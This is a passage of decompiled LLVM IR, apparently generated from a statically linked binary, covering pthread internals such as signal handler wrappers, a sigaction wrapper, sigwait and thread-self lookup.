  %v4_804c6cf = icmp eq i32 %v3_804c6cf, 0
  %v1_804c6d3 = icmp eq i1 %v4_804c6cf, false
  br i1 %v1_804c6d3, label %dec_label_pc_804c723, label %dec_label_pc_804c6d5

dec_label_pc_804c6d5:                             ; preds = %dec_label_pc_804c6c6
  %v1_804c6d5 = add i32 %v0_804c6cf, 8
  %v2_804c6d5 = inttoptr i32 %v1_804c6d5 to i32*
  %v3_804c6d5 = load i32, i32* %v2_804c6d5, align 4
  %v9_804c6d8 = icmp eq i32 %v3_804c6d5, 2147483647
  %v1_804c6dd = icmp eq i1 %v9_804c6d8, false
  br i1 %v1_804c6dd, label %dec_label_pc_804c6f8, label %dec_label_pc_804c6df

dec_label_pc_804c6df:                             ; preds = %dec_label_pc_804c6d5
  %v0_804c6df = load i32, i32* %stack_var_-8, align 4
  %v1_804c6df = call i32 @__errno_location(i32 %v0_804c6df)
  %v1_804c6e7 = inttoptr i32 %v1_804c6df to i32*
  store i32 34, i32* %v1_804c6e7, align 4
  %v0_804c6ed = load i32, i32* @esi, align 4
  store i32 %v0_804c6ed, i32* %stack_var_-188, align 4
  %v1_804c6ee = inttoptr i32 %v0_804c6ed to i32*
  %v2_804c6ee = call i32 @__pthread_unlock(i32* %v1_804c6ee)
  br label %dec_label_pc_804c707

dec_label_pc_804c6f8:                             ; preds = %dec_label_pc_804c6d5
  %v1_804c6f8 = add i32 %v3_804c6d5, 1
  store i32 %v1_804c6f8, i32* %v2_804c6d5, align 4
  %v0_804c6ff = load i32, i32* @esi, align 4
  store i32 %v0_804c6ff, i32* %stack_var_-188, align 4
  %v1_804c700 = inttoptr i32 %v0_804c6ff to i32*
  %v2_804c700 = call i32 @__pthread_unlock(i32* %v1_804c700)
  br label %dec_label_pc_804c707

dec_label_pc_804c707:                             ; preds = %dec_label_pc_804c6f8, %dec_label_pc_804c723, %dec_label_pc_804c6df
  %storemerge = phi i32 [ -1, %dec_label_pc_804c6df ], [ 0, %dec_label_pc_804c723 ], [ 0, %dec_label_pc_804c6f8 ]
  br label %dec_label_pc_804c793

dec_label_pc_804c723:                             ; preds = %dec_label_pc_804c6c6
  store i32 %v3_804c6cf, i32* @ebx, align 4
  %v1_804c716 = add i32 %v3_804c6cf, 8
  %v2_804c716 = inttoptr i32 %v1_804c716 to i32*
  %v3_804c716 = load i32, i32* %v2_804c716, align 4
  store i32 %v3_804c716, i32* %v2_804c6cf, align 4
  store i32 0, i32* %v2_804c716, align 4
  %v0_804c726.pre = load i32, i32* @esi, align 4
  store i32 %v0_804c726.pre, i32* %stack_var_-188, align 4
  %v1_804c727 = inttoptr i32 %v0_804c726.pre to i32*
  %v2_804c727 = call i32 @__pthread_unlock(i32* %v1_804c727)
  %v1_804c72c = add i32 %v3_804c6cf, 442
  %v2_804c72c = inttoptr i32 %v1_804c72c to i8*
  store i8 1, i8* %v2_804c72c, align 1
  store i32 %v3_804c6cf, i32* %stack_var_-188, align 4
  %v1_804c736 = call i32 @__pthread_restart_new(i32 %v3_804c6cf)
  br label %dec_label_pc_804c707

dec_label_pc_804c73d:                             ; preds = %entry
  %v0_804c73d = load i32, i32* @global_var_8062a84.142, align 4
  %v2_804c73d = icmp slt i32 %v0_804c73d, 0
  %v1_804c744 = icmp eq i1 %v2_804c73d, false
  br i1 %v1_804c744, label %dec_label_pc_804c76b.preheader, label %dec_label_pc_804c746

dec_label_pc_804c76b.preheader:                   ; preds = %dec_label_pc_804c746, %dec_label_pc_804c73d
  %v2_804c76b = ptrtoint i32* %stack_var_-156 to i32
  br label %dec_label_pc_804c76b

dec_label_pc_804c746:                             ; preds = %dec_label_pc_804c73d
  %v1_804c746 = call i32 @__pthread_initialize_manager(i32 %tmp13)
  %v2_804c74b = icmp slt i32 %v1_804c746, 0
  %v1_804c74d = icmp eq i1 %v2_804c74b, false
  br i1 %v1_804c74d, label %dec_label_pc_804c76b.preheader, label %dec_label_pc_804c74f

dec_label_pc_804c74f:                             ; preds = %dec_label_pc_804c746
  %v0_804c74f = load i32, i32* %stack_var_-188, align 4
  %v1_804c74f = call i32 @__errno_location(i32 %v0_804c74f)
  %v1_804c754 = inttoptr i32 %v1_804c74f to i32*
  store i32 11, i32* %v1_804c754, align 4
  br label %dec_label_pc_804c793

dec_label_pc_804c76b:                             ; preds = %dec_label_pc_804c76b.preheader, %dec_label_pc_804c787
  %v0_804c776 = load i32, i32* @global_var_8062a84.142, align 4
  store i32 %v0_804c776, i32* %stack_var_-188, align 4
  %v3_804c77c = call i32 @__libc_write(i32 %v0_804c776, i32 %v2_804c76b, i32 148)
  %v8_804c784 = icmp eq i32 %v3_804c77c, -1
  %v1_804c785 = icmp eq i1 %v8_804c784, false
  br i1 %v1_804c785, label %dec_label_pc_804c791, label %dec_label_pc_804c787

dec_label_pc_804c787:                             ; preds = %dec_label_pc_804c76b
  %v0_804c787 = load i32, i32* %stack_var_-188, align 4
  %v1_804c787 = call i32 @__errno_location(i32 %v0_804c787)
  %v1_804c78c = inttoptr i32 %v1_804c787 to i32*
  %v2_804c78c = load i32, i32* %v1_804c78c, align 4
  %v11_804c78c = icmp eq i32 %v2_804c78c, 4
  br i1 %v11_804c78c, label %dec_label_pc_804c76b, label %dec_label_pc_804c791

dec_label_pc_804c791:                             ; preds = %dec_label_pc_804c787, %dec_label_pc_804c76b
  br label %dec_label_pc_804c793

dec_label_pc_804c793:                             ; preds = %dec_label_pc_804c74f, %dec_label_pc_804c707, %dec_label_pc_804c791
  %v0_804c79b = phi i32 [ -1, %dec_label_pc_804c74f ], [ %storemerge, %dec_label_pc_804c707 ], [ 0, %dec_label_pc_804c791 ]
  %v2_804c799 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804c799, i32* @ebx, align 4
  store i32 %v0_804c6ac, i32* @esi, align 4
  ret i32 %v0_804c79b

; uselistorder directives
  uselistorder i32 %v3_804c6d5, { 1, 0 }
  uselistorder i32 %v3_804c6cf, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-8, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-188, { 2, 3, 1, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32, i32)* @thread_self.1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804c793, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c76b, { 1, 0 }
  uselistorder label %dec_label_pc_804c707, { 1, 0, 2 }
}

define i32 @pthread_null_sighandler() local_unnamed_addr {
entry:
  %v0_804c79c = load i32, i32* @eax, align 4
  ret i32 %v0_804c79c
}

define i32 @thread_self.2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_804c79d = load i32, i32* @esp, align 4
  %v1_804c79d = load i32, i32* @global_var_806338c.133, align 4
  %v7_804c79d = icmp ult i32 %v0_804c79d, %v1_804c79d
  %v1_804c7aa = icmp eq i1 %v7_804c79d, false
  br i1 %v1_804c7aa, label %dec_label_pc_804c7db, label %dec_label_pc_804c7ac

dec_label_pc_804c7ac:                             ; preds = %entry
  %v1_804c7ac = load i32, i32* @global_var_8063390.134, align 16
  %v7_804c7ac = icmp ult i32 %v0_804c79d, %v1_804c7ac
  br i1 %v7_804c7ac, label %dec_label_pc_804c7c1, label %dec_label_pc_804c7b4

dec_label_pc_804c7b4:                             ; preds = %dec_label_pc_804c7ac
  %v1_804c7b4 = load i32, i32* @global_var_8063394.135, align 4
  %v7_804c7b4 = icmp ult i32 %v0_804c79d, %v1_804c7b4
  br i1 %v7_804c7b4, label %dec_label_pc_804c7db, label %dec_label_pc_804c7c1

dec_label_pc_804c7c1:                             ; preds = %dec_label_pc_804c7b4, %dec_label_pc_804c7ac
  %v0_804c7c1 = load i32, i32* @global_var_80679f0.137, align 16
  %v1_804c7c1 = icmp eq i32 %v0_804c7c1, 0
  br i1 %v1_804c7c1, label %dec_label_pc_804c7cf, label %dec_label_pc_804c7ca

dec_label_pc_804c7ca:                             ; preds = %dec_label_pc_804c7c1
  %v0_804c7ca = call i32 @__pthread_find_self()
  br label %dec_label_pc_804c7cf

dec_label_pc_804c7cf:                             ; preds = %dec_label_pc_804c7c1, %dec_label_pc_804c7ca
  %v2_804c7d5 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804c7db

dec_label_pc_804c7db:                             ; preds = %dec_label_pc_804c7b4, %entry, %dec_label_pc_804c7cf
  %v0_804c7db = phi i32 [ ptrtoint (i32* @global_var_80628a0.136 to i32), %dec_label_pc_804c7b4 ], [ ptrtoint (i32* @global_var_80626c0 to i32), %entry ], [ %v2_804c7d5, %dec_label_pc_804c7cf ]
  ret i32 %v0_804c7db

; uselistorder directives
  uselistorder label %dec_label_pc_804c7db, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c7cf, { 1, 0 }
}

define i32 @pthread_sighandler_rt(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804c7dc = load i32, i32* @edi, align 4
  %v0_804c7dd = load i32, i32* @esi, align 4
  %v0_804c7de = load i32, i32* @ebx, align 4
  store i32 %v0_804c7de, i32* %stack_var_-12, align 4
  %v3_804c7df = call i32 @thread_self.2(i32 %v0_804c7de, i32 %v0_804c7dd, i32 %v0_804c7dc)
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_804c7e8 = add i32 %v3_804c7df, 88
  %v2_804c7e8 = inttoptr i32 %v1_804c7e8 to i8*
  %v3_804c7e8 = load i8, i8* %v2_804c7e8, align 1
  %v4_804c7e8 = icmp eq i8 %v3_804c7e8, 0
  store i32 %v3_804c7df, i32* %ebx.global-to-local, align 4
  br i1 %v4_804c7e8, label %dec_label_pc_804c7f9, label %dec_label_pc_804c7f0

dec_label_pc_804c7f0:                             ; preds = %entry
  store i8 0, i8* %v2_804c7e8, align 1
  %v0_804c7f4 = load i32, i32* %edi.global-to-local, align 4
  %v2_804c7f4 = add i32 %v3_804c7df, 32
  %v3_804c7f4 = inttoptr i32 %v2_804c7f4 to i32*
  store i32 %v0_804c7f4, i32* %v3_804c7f4, align 4
  br label %dec_label_pc_804c822

dec_label_pc_804c7f9:                             ; preds = %entry
  %v4_804c7de = ptrtoint i32* %stack_var_-12 to i32
  %v1_804c7f9 = add i32 %v3_804c7df, 84
  %v2_804c7f9 = inttoptr i32 %v1_804c7f9 to i32*
  %v3_804c7f9 = load i32, i32* %v2_804c7f9, align 4
  %v1_804c7fc = icmp eq i32 %v3_804c7f9, 0
  store i32 %v4_804c7de, i32* %v2_804c7f9, align 4
  %v0_804c80c = load i32, i32* %edi.global-to-local, align 4
  %v5_804c80d = mul i32 %v0_804c80c, 4
  %v6_804c80d = add i32 %v5_804c80d, ptrtoint (i32* @global_var_8063280.168 to i32)
  %v7_804c80d = inttoptr i32 %v6_804c80d to i32*
  %v8_804c80d = load i32, i32* %v7_804c80d, align 4
  call void @__pseudo_call(i32 %v8_804c80d)
  %v1_804c819 = icmp eq i1 %v1_804c7fc, false
  br i1 %v1_804c819, label %dec_label_pc_804c822, label %dec_label_pc_804c81b

dec_label_pc_804c81b:                             ; preds = %dec_label_pc_804c7f9
  %v0_804c81b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c81b = add i32 %v0_804c81b, 84
  %v2_804c81b = inttoptr i32 %v1_804c81b to i32*
  store i32 0, i32* %v2_804c81b, align 4
  br label %dec_label_pc_804c822

dec_label_pc_804c822:                             ; preds = %dec_label_pc_804c7f9, %dec_label_pc_804c7f0, %dec_label_pc_804c81b
  %v2_804c822 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804c822, i32* %ebx.global-to-local, align 4
  store i32 %v0_804c7dc, i32* %edi.global-to-local, align 4
  ret i32 %v3_804c7df

; uselistorder directives
  uselistorder i32 %v3_804c7df, { 1, 2, 3, 0, 4 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804c822, { 2, 0, 1 }
}

define i32 @pthread_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804c826 = load i32, i32* @edi, align 4
  %v0_804c827 = load i32, i32* @esi, align 4
  %v0_804c828 = load i32, i32* @ebx, align 4
  store i32 %v0_804c828, i32* %stack_var_-12, align 4
  %v3_804c829 = call i32 @thread_self.2(i32 %v0_804c828, i32 %v0_804c827, i32 %v0_804c826)
  store i32 %v3_804c829, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804c832 = add i32 %v3_804c829, 88
  %v2_804c832 = inttoptr i32 %v1_804c832 to i8*
  %v3_804c832 = load i8, i8* %v2_804c832, align 1
  %v4_804c832 = icmp eq i8 %v3_804c832, 0
  store i32 %v3_804c829, i32* %ebx.global-to-local, align 4
  br i1 %v4_804c832, label %dec_label_pc_804c843, label %dec_label_pc_804c83a

dec_label_pc_804c83a:                             ; preds = %entry
  store i8 0, i8* %v2_804c832, align 1
  %v0_804c83e = load i32, i32* @esi, align 4
  %v1_804c83e = load i32, i32* %eax.global-to-local, align 4
  %v2_804c83e = add i32 %v1_804c83e, 32
  %v3_804c83e = inttoptr i32 %v2_804c83e to i32*
  store i32 %v0_804c83e, i32* %v3_804c83e, align 4
  br label %dec_label_pc_804c87a

dec_label_pc_804c843:                             ; preds = %entry
  %v4_804c828 = ptrtoint i32* %stack_var_-12 to i32
  %v1_804c843 = add i32 %v3_804c829, 84
  %v2_804c843 = inttoptr i32 %v1_804c843 to i32*
  %v3_804c843 = load i32, i32* %v2_804c843, align 4
  %v1_804c846 = icmp eq i32 %v3_804c843, 0
  store i32 %v4_804c828, i32* %v2_804c843, align 4
  %v2_804c852 = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_804c852, i32* %eax.global-to-local, align 4
  %v3_804c85c = bitcast i32* %stack_var_-104 to i16*
  %v4_804c85c = call i32 @memcpy(i16* %v3_804c85c, i32 %v2_804c852, i32 88)
  store i32 %v4_804c85c, i32* %eax.global-to-local, align 4
  %v0_804c864 = load i32, i32* @esi, align 4
  %v5_804c865 = mul i32 %v0_804c864, 4
  %v6_804c865 = add i32 %v5_804c865, ptrtoint (i32* @global_var_8063280.168 to i32)
  %v7_804c865 = inttoptr i32 %v6_804c865 to i32*
  %v8_804c865 = load i32, i32* %v7_804c865, align 4
  call void @__pseudo_call(i32 %v8_804c865)
  %v1_804c871 = icmp eq i1 %v1_804c846, false
  br i1 %v1_804c871, label %dec_label_pc_804c87a, label %dec_label_pc_804c873

dec_label_pc_804c873:                             ; preds = %dec_label_pc_804c843
  %v0_804c873 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c873 = add i32 %v0_804c873, 84
  %v2_804c873 = inttoptr i32 %v1_804c873 to i32*
  store i32 0, i32* %v2_804c873, align 4
  br label %dec_label_pc_804c87a

dec_label_pc_804c87a:                             ; preds = %dec_label_pc_804c843, %dec_label_pc_804c83a, %dec_label_pc_804c873
  %v2_804c87a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804c87a, i32* %ebx.global-to-local, align 4
  %v0_804c87d = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804c87d

; uselistorder directives
  uselistorder i32 %v3_804c829, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_804c87a, { 2, 0, 1 }
}

define i32 @__GI_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp9 = ptrtoint i32* %arg2 to i32
  %stack_var_-156 = alloca i32, align 4
  %v0_804c87f = load i32, i32* @edi, align 4
  %v0_804c880 = load i32, i32* @esi, align 4
  %v0_804c881 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804c88f = load i32, i32* @global_var_8062a88.170, align 8
  %v12_804c88f = icmp eq i32 %v1_804c88f, %arg1
  br i1 %v12_804c88f, label %dec_label_pc_804c947, label %dec_label_pc_804c8a9

dec_label_pc_804c8a9:                             ; preds = %entry
  %v1_804c8a9 = load i32, i32* @global_var_8062a8c.154, align 4
  %v12_804c8a9 = icmp eq i32 %v1_804c8a9, %arg1
  br i1 %v12_804c8a9, label %dec_label_pc_804c947, label %dec_label_pc_804c8b5

dec_label_pc_804c8b5:                             ; preds = %dec_label_pc_804c8a9
  %v1_804c8b5 = load i32, i32* @global_var_8062a90.145, align 16
  %v12_804c8b5 = icmp eq i32 %v1_804c8b5, %arg1
  %v1_804c8bb = icmp eq i1 %v12_804c8b5, false
  br i1 %v1_804c8bb, label %dec_label_pc_804c8c5, label %dec_label_pc_804c8bd

dec_label_pc_804c8bd:                             ; preds = %dec_label_pc_804c8b5
  %tmp22 = icmp slt i32 %arg1, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_804c947, label %dec_label_pc_804c8c5

dec_label_pc_804c8c5:                             ; preds = %dec_label_pc_804c8bd, %dec_label_pc_804c8b5
  %v1_804c8c7 = icmp eq i32* %arg2, null
  %.pre = ptrtoint i32* %stack_var_-156 to i32
  br i1 %v1_804c8c7, label %dec_label_pc_804c8c5.dec_label_pc_804c910_crit_edge, label %dec_label_pc_804c8cb

dec_label_pc_804c8c5.dec_label_pc_804c910_crit_edge: ; preds = %dec_label_pc_804c8c5
  br label %dec_label_pc_804c910

dec_label_pc_804c8cb:                             ; preds = %dec_label_pc_804c8c5
  store i32 %.pre, i32* @esi, align 4
  %v3_804c8d7 = bitcast i32* %stack_var_-156 to i16*
  %v4_804c8d7 = call i32 @memcpy(i16* %v3_804c8d7, i32 %tmp9, i32 140)
  %v2_804c8df = load i32, i32* %arg2, align 4
  %tmp = or i32 %v2_804c8df, 1
  %tmp25 = icmp eq i32 %tmp, 1
  br i1 %tmp25, label %dec_label_pc_804c90c, label %dec_label_pc_804c8e4

dec_label_pc_804c8e4:                             ; preds = %dec_label_pc_804c8cb
  %tmp24 = icmp slt i32 %arg1, 1
  br i1 %tmp24, label %dec_label_pc_804c90c, label %dec_label_pc_804c8e8

dec_label_pc_804c8e8:                             ; preds = %dec_label_pc_804c8e4
  %v1_804c8e8 = add i32 %arg1, -64
  %v3_804c8e8 = sub i32 63, %arg1
  %v4_804c8e8 = and i32 %v3_804c8e8, %arg1
  %v5_804c8e8 = icmp slt i32 %v4_804c8e8, 0
  %v6_804c8e8 = icmp eq i32 %v1_804c8e8, 0
  %v7_804c8e8 = icmp slt i32 %v1_804c8e8, 0
  %v3_804c8eb = icmp eq i1 %v7_804c8e8, %v5_804c8e8
  %v4_804c8eb = icmp eq i1 %v6_804c8e8, false
  %v5_804c8eb = and i1 %v4_804c8eb, %v3_804c8eb
  br i1 %v5_804c8eb, label %dec_label_pc_804c90c, label %dec_label_pc_804c8ed

dec_label_pc_804c8ed:                             ; preds = %dec_label_pc_804c8e8
  %v1_804c8ed = add i32 %tmp9, 132
  %v2_804c8ed = inttoptr i32 %v1_804c8ed to i8*
  %v3_804c8ed = load i8, i8* %v2_804c8ed, align 1
  %v4_804c8ed = and i8 %v3_804c8ed, 4
  %v5_804c8ed = icmp eq i8 %v4_804c8ed, 0
  %. = select i1 %v5_804c8ed, i32 134531110, i32 134531036
  store i32 %., i32* %stack_var_-156, align 4
  br label %dec_label_pc_804c910

dec_label_pc_804c90c:                             ; preds = %dec_label_pc_804c8e8, %dec_label_pc_804c8e4, %dec_label_pc_804c8cb
  br label %dec_label_pc_804c910

dec_label_pc_804c910:                             ; preds = %dec_label_pc_804c8c5.dec_label_pc_804c910_crit_edge, %dec_label_pc_804c8ed, %dec_label_pc_804c90c
  %v0_804c912 = phi i32 [ 0, %dec_label_pc_804c8c5.dec_label_pc_804c910_crit_edge ], [ %.pre, %dec_label_pc_804c8ed ], [ %.pre, %dec_label_pc_804c90c ]
  %v3_804c914 = inttoptr i32 %v0_804c912 to i32*
  %v4_804c914 = call i32 @__libc_sigaction(i32 %arg1, i32* %v3_804c914, i32 %.pre)
  store i32 -1, i32* @edx, align 4
  %v8_804c91f = icmp eq i32 %v4_804c914, -1
  br i1 %v8_804c91f, label %dec_label_pc_804c950, label %dec_label_pc_804c922

dec_label_pc_804c922:                             ; preds = %dec_label_pc_804c910
  %v1_804c922 = add i32 %arg1, -1
  %v6_804c928 = icmp ugt i32 %v1_804c922, 63
  br i1 %v6_804c928, label %dec_label_pc_804c94e, label %dec_label_pc_804c92a

dec_label_pc_804c92a:                             ; preds = %dec_label_pc_804c922
  %v1_804c92a = icmp eq i32 %arg3, 0
  br i1 %v1_804c92a, label %dec_label_pc_804c938, label %dec_label_pc_804c92e

dec_label_pc_804c92e:                             ; preds = %dec_label_pc_804c92a
  %v1_804c92e = mul i32 %arg1, 4
  %v2_804c92e = add i32 %v1_804c92e, ptrtoint (i32* @global_var_8063280.168 to i32)
  %v3_804c92e = inttoptr i32 %v2_804c92e to i32*
  %v4_804c92e = load i32, i32* %v3_804c92e, align 4
  %v2_804c935 = inttoptr i32 %arg3 to i32*
  store i32 %v4_804c92e, i32* %v2_804c935, align 4
  br label %dec_label_pc_804c938

dec_label_pc_804c938:                             ; preds = %dec_label_pc_804c92a, %dec_label_pc_804c92e
  br i1 %v1_804c8c7, label %dec_label_pc_804c94e, label %dec_label_pc_804c93c

dec_label_pc_804c93c:                             ; preds = %dec_label_pc_804c938
  %v2_804c93c = load i32, i32* %arg2, align 4
  %v2_804c93e = mul i32 %arg1, 4
  %v3_804c93e = add i32 %v2_804c93e, ptrtoint (i32* @global_var_8063280.168 to i32)
  %v4_804c93e = inttoptr i32 %v3_804c93e to i32*
  store i32 %v2_804c93c, i32* %v4_804c93e, align 4
  br label %dec_label_pc_804c94e

dec_label_pc_804c947:                             ; preds = %dec_label_pc_804c8bd, %dec_label_pc_804c8a9, %entry
  store i32 22, i32* @edx, align 4
  br label %dec_label_pc_804c950

dec_label_pc_804c94e:                             ; preds = %dec_label_pc_804c938, %dec_label_pc_804c922, %dec_label_pc_804c93c
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_804c950

dec_label_pc_804c950:                             ; preds = %dec_label_pc_804c910, %dec_label_pc_804c947, %dec_label_pc_804c94e
  %v0_804c956 = phi i32 [ -1, %dec_label_pc_804c910 ], [ 22, %dec_label_pc_804c947 ], [ 0, %dec_label_pc_804c94e ]
  store i32 %v0_804c881, i32* @ebx, align 4
  store i32 %v0_804c880, i32* @esi, align 4
  store i32 %v0_804c87f, i32* @edi, align 4
  ret i32 %v0_804c956

; uselistorder directives
  uselistorder i32 %v1_804c8e8, { 1, 0 }
  uselistorder i32 %.pre, { 0, 3, 2, 1 }
  uselistorder i1 %v1_804c8c7, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 2, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %arg1, { 8, 6, 7, 9, 3, 11, 10, 4, 5, 0, 1, 2, 12 }
  uselistorder label %dec_label_pc_804c950, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c94e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c938, { 1, 0 }
  uselistorder label %dec_label_pc_804c910, { 2, 1, 0 }
}

define i32 @sigwait(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %stack_var_-440 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %v0_804c95d = load i32, i32* @edi, align 4
  %v0_804c95e = load i32, i32* @esi, align 4
  store i32 1, i32* @esi, align 4
  %v0_804c964 = load i32, i32* @ebx, align 4
  %v3_804c96b = call i32 @thread_self.2(i32 %v0_804c964, i32 %v0_804c95e, i32 %v0_804c95d)
  store i32 %arg1, i32* @edi, align 4
  %v2_804c981 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804c981, i32* @ebx, align 4
  %v1_804c989 = call i32 @sigfillset(i32 %v2_804c981)
  %v1_804c997 = call i32 @__GI_sigdelset(i32 %v2_804c981)
  %v0_804ca26.pr = load i32, i32* @esi, align 4
  %v2_804c9f7 = ptrtoint i32* %stack_var_-280 to i32
  %v2_804c9fe = ptrtoint i32* %stack_var_-284 to i32
  %v7_804ca2928 = icmp sgt i32 %v0_804ca26.pr, 65
  br i1 %v7_804ca2928, label %dec_label_pc_804ca2f, label %dec_label_pc_804c9a4.lr.ph

dec_label_pc_804c9a4.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804c9a4

dec_label_pc_804c9a4:                             ; preds = %dec_label_pc_804c9a4.lr.ph, %dec_label_pc_804ca25
  %v0_804c9a630 = phi i32 [ %v0_804ca26.pr, %dec_label_pc_804c9a4.lr.ph ], [ %v1_804ca25, %dec_label_pc_804ca25 ]
  %v3_804c9a829 = phi i32 [ %v1_804c997, %dec_label_pc_804c9a4.lr.ph ], [ %v0_804ca2f2, %dec_label_pc_804ca25 ]
  %v0_804c9a7 = load i32, i32* @edi, align 4
  %v4_804c9a8 = call i32 @sigismember(i32 %v0_804c9a7, i32 %v0_804c9a630, i32 %v3_804c9a829, i32 %v3_804c9a829)
  %v1_804c9b0 = icmp eq i32 %v4_804c9a8, 0
  br i1 %v1_804c9b0, label %dec_label_pc_804ca25, label %dec_label_pc_804c9b4

dec_label_pc_804c9b4:                             ; preds = %dec_label_pc_804c9a4
  %v0_804c9b4 = load i32, i32* @esi, align 4
  %v1_804c9b4 = load i32, i32* @global_var_8062a88.170, align 8
  %v12_804c9b4 = icmp eq i32 %v0_804c9b4, %v1_804c9b4
  br i1 %v12_804c9b4, label %dec_label_pc_804ca25, label %dec_label_pc_804c9bc

dec_label_pc_804c9bc:                             ; preds = %dec_label_pc_804c9b4
  %v1_804c9bc = load i32, i32* @global_var_8062a8c.154, align 4
  %v12_804c9bc = icmp eq i32 %v0_804c9b4, %v1_804c9bc
  br i1 %v12_804c9bc, label %dec_label_pc_804ca25, label %dec_label_pc_804c9c4

dec_label_pc_804c9c4:                             ; preds = %dec_label_pc_804c9bc
  %v1_804c9c4 = load i32, i32* @global_var_8062a90.145, align 16
  %v12_804c9c4 = icmp eq i32 %v0_804c9b4, %v1_804c9c4
  br i1 %v12_804c9c4, label %dec_label_pc_804ca25, label %dec_label_pc_804c9cc

dec_label_pc_804c9cc:                             ; preds = %dec_label_pc_804c9c4
  %v1_804c9d7 = call i32 @__GI_sigdelset(i32 %v2_804c981)
  %v0_804c9df = load i32, i32* @esi, align 4
  %v1_804c9df = mul i32 %v0_804c9df, 4
  %v2_804c9df = add i32 %v1_804c9df, ptrtoint (i32* @global_var_8063280.168 to i32)
  %v3_804c9df = inttoptr i32 %v2_804c9df to i32*
  %v4_804c9df = load i32, i32* %v3_804c9df, align 4
  %tmp = or i32 %v4_804c9df, 1
  %tmp31 = icmp eq i32 %tmp, 1
  br i1 %tmp31, label %dec_label_pc_804c9e9, label %dec_label_pc_804ca25

dec_label_pc_804c9e9:                             ; preds = %dec_label_pc_804c9cc
  store i32 134530972, i32* %stack_var_-284, align 4
  store i32 %v2_804c9fe, i32* @ebx, align 4
  %v1_804ca06 = call i32 @sigemptyset(i32 %v2_804c9f7)
  %v0_804ca1c = load i32, i32* @esi, align 4
  %v4_804ca1d = call i32 @__GI_sigaction(i32 %v0_804ca1c, i32* nonnull %stack_var_-284, i32 0)
  br label %dec_label_pc_804ca25

dec_label_pc_804ca25:                             ; preds = %dec_label_pc_804c9cc, %dec_label_pc_804c9c4, %dec_label_pc_804c9bc, %dec_label_pc_804c9b4, %dec_label_pc_804c9a4, %dec_label_pc_804c9e9
  %v0_804ca2f2 = phi i32 [ %v1_804c9d7, %dec_label_pc_804c9cc ], [ %v4_804c9a8, %dec_label_pc_804c9c4 ], [ %v4_804c9a8, %dec_label_pc_804c9bc ], [ %v4_804c9a8, %dec_label_pc_804c9b4 ], [ 0, %dec_label_pc_804c9a4 ], [ %v4_804ca1d, %dec_label_pc_804c9e9 ]
  %v0_804ca25 = load i32, i32* @esi, align 4
  %v1_804ca25 = add i32 %v0_804ca25, 1
  store i32 %v1_804ca25, i32* @esi, align 4
  %v7_804ca29 = icmp sgt i32 %v1_804ca25, 65
  br i1 %v7_804ca29, label %dec_label_pc_804ca2f, label %dec_label_pc_804c9a4

dec_label_pc_804ca2f:                             ; preds = %dec_label_pc_804ca25, %entry
  %v2_804ca33 = ptrtoint i32* %stack_var_-440 to i32
  %v3_804ca38 = call i32 @__sigsetjmp(i32 %v2_804ca33, i32* inttoptr (i32 1 to i32*))
  %v1_804ca40 = icmp eq i32 %v3_804ca38, 0
  %v1_804ca42 = icmp eq i1 %v1_804ca40, false
  br i1 %v1_804ca42, label %dec_label_pc_804ca2f.dec_label_pc_804ca98_crit_edge, label %dec_label_pc_804ca44

dec_label_pc_804ca2f.dec_label_pc_804ca98_crit_edge: ; preds = %dec_label_pc_804ca2f
  %.pre = add i32 %v3_804c96b, 40
  %.pre3 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_804ca98

dec_label_pc_804ca44:                             ; preds = %dec_label_pc_804ca2f
  %v2_804ca4f = add i32 %v3_804c96b, 40
  %v3_804ca4f = inttoptr i32 %v2_804ca4f to i32*
  store i32 %v2_804ca33, i32* %v3_804ca4f, align 4
  %v1_804ca59 = add i32 %v3_804c96b, 66
  %v2_804ca59 = inttoptr i32 %v1_804ca59 to i8*
  %v3_804ca59 = load i8, i8* %v2_804ca59, align 1
